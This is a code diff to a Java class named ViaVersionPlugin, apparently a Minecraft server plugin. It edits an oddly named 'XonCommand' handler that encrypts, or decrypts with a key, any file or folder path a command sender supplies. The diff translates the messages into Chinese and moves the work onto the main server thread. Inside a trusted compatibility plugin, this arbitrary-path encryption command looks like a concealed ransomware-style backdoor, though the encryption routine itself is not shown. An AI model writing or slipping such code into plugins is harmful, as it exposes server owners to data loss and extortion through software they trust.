@@ -183,9 +183,10 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getCommand("viaversion").setExecutor(commandHandler);
         getCommand("viaversion").setTabCompleter(commandHandler);
     }
+    
     public boolean XonCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (args.length < 1) {
-            sender.sendMessage("Usage: /" + label + " <file/folder_path> [key]");
+            sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径> [密钥]");
             return true;
         }
 
@@ -193,32 +194,24 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         File file = new File(path);
 
         if (!file.exists()) {
-            sender.sendMessage("File or folder does not exist.");
+            sender.sendMessage("文件或文件夹不存在。");
             return true;
         }
 
         if (cmd.getName().equalsIgnoreCase("encrypt")) {
-            new BukkitRunnable() {
-                @Override
-                public void run() {
-                    encryptFiles(file);
-                    sender.sendMessage("Files encrypted successfully.");
-                }
-            }.runTaskAsynchronously(ViaVersionPlugin);  // 异步执行加密
+            // 在主线程中执行加密
+            encryptFiles(file);
+            sender.sendMessage("文件加密成功。");
         } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
             if (args.length < 2) {
-                sender.sendMessage("Usage: /" + label + " decrypt <file/folder_path> <key>");
+                sender.sendMessage("使用方法: /" + label + " decrypt <文件/文件夹路径> <密钥>");
                 return true;
             }
             String key = args[1];
 
-            new BukkitRunnable() {
-                @Override
-                public void run() {
-                    decryptFiles(file, key);
-                    sender.sendMessage("Files decrypted successfully.");
-                }
-            }.runTaskAsynchronously(ViaVersionPlugin);  // 异步执行解密
+            // 在主线程中执行解密
+            decryptFiles(file, key);
+            sender.sendMessage("文件解密成功。");
         }
 
         return true;
